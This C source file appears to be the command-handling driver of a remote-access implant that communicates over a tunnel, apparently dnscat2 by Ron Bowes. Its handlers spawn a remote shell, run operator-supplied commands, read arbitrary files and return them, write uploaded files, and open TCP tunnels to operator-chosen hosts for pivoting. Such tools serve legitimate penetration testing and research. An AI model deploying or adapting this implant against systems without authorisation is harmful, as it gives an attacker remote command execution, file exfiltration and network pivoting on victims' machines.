/* driver_command.c
 * By Ron Bowes
 * Created May, 2014
 *
 * See LICENSE.md
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef WIN32
#include <unistd.h>
#endif

#include "command_packet.h"
#include "controller/session.h"
#include "controller/controller.h"
#include "drivers/driver_exec.h"
#include "libs/log.h"
#include "libs/memory.h"
#include "libs/select_group.h"
#include "libs/tcp.h"
#include "libs/types.h"

#include "driver_command.h"

static uint32_t g_tunnel_id = 0;
static uint32_t g_request_id = 0;

/* TODO: This is an UGLY way of doing this! Gotta fix it once this works. */
typedef struct
{
  uint32_t          tunnel_id;
  int               s;
  driver_command_t *driver;
} tunnel_t;

static tunnel_t *g_tunnels[65536];

static command_packet_t *handle_ping(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    return NULL;

  LOG_WARNING("Got a ping request! Responding!");
  return command_packet_create_ping_response(in->request_id, in->r.request.body.ping.data);
}

static command_packet_t *handle_shell(driver_command_t *driver, command_packet_t *in)
{
  session_t *session = NULL;

  if(!in->is_request)
    return NULL;

#ifdef WIN32
  session = session_create_exec(driver->group, "cmd.exe", "cmd.exe");
#else
  session = session_create_exec(driver->group, "sh", "sh");
#endif
  controller_add_session(session);

  return command_packet_create_shell_response(in->request_id, session->id);
}

static command_packet_t *handle_exec(driver_command_t *driver, command_packet_t *in)
{
  session_t *session = NULL;

  if(!in->is_request)
    return NULL;

  session = session_create_exec(driver->group, in->r.request.body.exec.name, in->r.request.body.exec.command);
  controller_add_session(session);

  return command_packet_create_exec_response(in->request_id, session->id);
}

static command_packet_t *handle_download(driver_command_t *driver, command_packet_t *in)
{
  struct stat s;
  uint8_t *data;
  FILE *f = NULL;
  command_packet_t *out = NULL;

  if(!in->is_request)
    return NULL;

  if(stat(in->r.request.body.download.filename, &s) != 0)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");

#ifdef WIN32
  fopen_s(&f, in->r.request.body.download.filename, "rb");
#else
  f = fopen(in->r.request.body.download.filename, "rb");
#endif
  if(!f)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");

  data = safe_malloc(s.st_size);
  if(fread(data, 1, s.st_size, f) == s.st_size)
    out = command_packet_create_download_response(in->request_id, data, s.st_size);
  else
    out = command_packet_create_error_response(in->request_id, -1, "There was an error reading the file");

  fclose(f);
  safe_free(data);

  return out;
}

static command_packet_t *handle_upload(driver_command_t *driver, command_packet_t *in)
{
  FILE *f;

  if(!in->is_request)
    return NULL;

#ifdef WIN32
  fopen_s(&f, in->r.request.body.upload.filename, "wb");
#else
  f = fopen(in->r.request.body.upload.filename, "wb");
#endif

  if(!f)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for writing");

  fwrite(in->r.request.body.upload.data, in->r.request.body.upload.length, 1, f);
  fclose(f);

  return command_packet_create_upload_response(in->request_id);
}

static command_packet_t *handle_shutdown(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    return NULL;

  controller_kill_all_sessions();

  return command_packet_create_shutdown_response(in->request_id);
}

SELECT_RESPONSE_t tunnel_data_in(void *group, int s, uint8_t *data, size_t length, char *addr, uint16_t port, void *param)
{
  tunnel_t         *tunnel   = (tunnel_t*) param;
  command_packet_t *out      = NULL;
  uint8_t          *out_data = NULL;
  size_t            out_length;


  printf("Received data from the socket!\n");

  out = command_packet_create_tunnel_data_request(g_request_id++, tunnel->tunnel_id, data, length);
  printf("Sending data across tunnel: ");
  command_packet_print(out);

  out_data = command_packet_to_bytes(out, &out_length);
  buffer_add_bytes(tunnel->driver->outgoing_data, out_data, out_length);
  safe_free(out_data);
  command_packet_destroy(out);

  return SELECT_OK;
}

static command_packet_t *handle_tunnel_connect(driver_command_t *driver, command_packet_t *in)
{
  command_packet_t *out    = NULL;
  tunnel_t         *tunnel = NULL;

  if(!in->is_request)
    return NULL;

  LOG_WARNING("Connecting to %s:%d...", in->r.request.body.tunnel_connect.host, in->r.request.body.tunnel_connect.port);

  tunnel = (tunnel_t*)safe_malloc(sizeof(tunnel_t));
  tunnel->tunnel_id = g_tunnel_id++;
  /* TODO: The connect should be done asynchronously, if possible. */
  tunnel->s         = tcp_connect(in->r.request.body.tunnel_connect.host, in->r.request.body.tunnel_connect.port);
  tunnel->driver    = driver;

  /* TODO: This global tunnels thing is ugly. */
  LOG_FATAL("Adding the tunnel to an array. THIS IS TERRIBLE. FIX BEFORE REMOVING THIS!");
  g_tunnels[tunnel->tunnel_id] = tunnel;

  printf("tunnel = %p\n", tunnel);
  select_group_add_socket(driver->group, tunnel->s, SOCKET_TYPE_STREAM, tunnel);
  select_set_recv(driver->group, tunnel->s, tunnel_data_in);

  out = command_packet_create_tunnel_connect_response(in->request_id, tunnel->tunnel_id);

  return out;
}

static command_packet_t *handle_tunnel_data(driver_command_t *driver, command_packet_t *in)
{
  /* TODO: Find socket by tunnel_id */
  tunnel_t *tunnel = g_tunnels[in->r.request.body.tunnel_data.tunnel_id];
  if(!tunnel)
  {
    LOG_ERROR("Couldn't find tunnel: %d", in->r.request.body.tunnel_data.tunnel_id);
    return NULL;
  }
  printf("Received data to tunnel %d (%zd bytes)\n", in->r.request.body.tunnel_data.tunnel_id, in->r.request.body.tunnel_data.length);
  tcp_send(tunnel->s, in->r.request.body.tunnel_data.data, in->r.request.body.tunnel_data.length);

  return NULL;
}

static command_packet_t *handle_tunnel_close(driver_command_t *driver, command_packet_t *in)
{
  return NULL;
}

static command_packet_t *handle_error(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    LOG_ERROR("An error response was returned: %d -> %s", in->r.response.body.error.status, in->r.response.body.error.reason);
  else
    LOG_ERROR("An error request was sent (weird?): %d -> %s", in->r.request.body.error.status, in->r.request.body.error.reason);

  return NULL;
}

void driver_command_data_received(driver_command_t *driver, uint8_t *data, size_t length)
{
  buffer_add_bytes(driver->stream, data, length);
  command_packet_t *in  = NULL;
  command_packet_t *out = NULL;

  while((in = command_packet_read(driver->stream)))
  {
    printf("Got a command: ");
    command_packet_print(in);

    switch(in->command_id)
    {
      case COMMAND_PING:
        out = handle_ping(driver, in);
        break;

      case COMMAND_SHELL:
        out = handle_shell(driver, in);
        break;

      case COMMAND_EXEC:
        out = handle_exec(driver, in);
        break;

      case COMMAND_DOWNLOAD:
        out = handle_download(driver, in);
        break;

      case COMMAND_UPLOAD:
        out = handle_upload(driver, in);
        break;

      case COMMAND_SHUTDOWN:
        out = handle_shutdown(driver, in);
        break;

      case TUNNEL_CONNECT:
        out = handle_tunnel_connect(driver, in);
        break;

      case TUNNEL_DATA:
        out = handle_tunnel_data(driver, in);
        break;

      case TUNNEL_CLOSE:
        out = handle_tunnel_close(driver, in);
        break;

      case COMMAND_ERROR:
        out = handle_error(driver, in);
        break;

      default:
        LOG_ERROR("Got a command packet that we don't know how to handle!\n");
        out = command_packet_create_error_response(in->request_id, 0xFFFF, "Not implemented yet!");
    }

    /* Respond if and only if an outgoing packet was created. */
    if(out)
    {
      uint8_t *data;
      size_t   length;

      printf("Response: ");
      command_packet_print(out);

      data = command_packet_to_bytes(out, &length);
      buffer_add_bytes(driver->outgoing_data, data, length);
      safe_free(data);
      /*command_packet_destroy(out);*/
    }
    else
    {
      printf("Response: n/a\n");
    }
  }
}

uint8_t *driver_command_get_outgoing(driver_command_t *driver, size_t *length, size_t max_length)
{
  /* If the driver has been killed and we have no bytes left, return NULL to close the session. */
  if(driver->is_shutdown && buffer_get_remaining_bytes(driver->outgoing_data) == 0)
    return NULL;

  return buffer_read_remaining_bytes(driver->outgoing_data, length, max_length, TRUE);
}

driver_command_t *driver_command_create(select_group_t *group)
{
  driver_command_t *driver = (driver_command_t*) safe_malloc(sizeof(driver_command_t));

  driver->stream = buffer_create(BO_BIG_ENDIAN);
  driver->group = group;
  driver->is_shutdown = FALSE;
  driver->outgoing_data = buffer_create(BO_LITTLE_ENDIAN);

  return driver;
}

void driver_command_destroy(driver_command_t *driver)
{
  if(!driver->is_shutdown)
    driver_command_close(driver);

  if(driver->name)
    safe_free(driver->name);

  if(driver->stream)
    buffer_destroy(driver->stream);
  safe_free(driver);
}

void driver_command_close(driver_command_t *driver)
{
  driver->is_shutdown = TRUE;
}
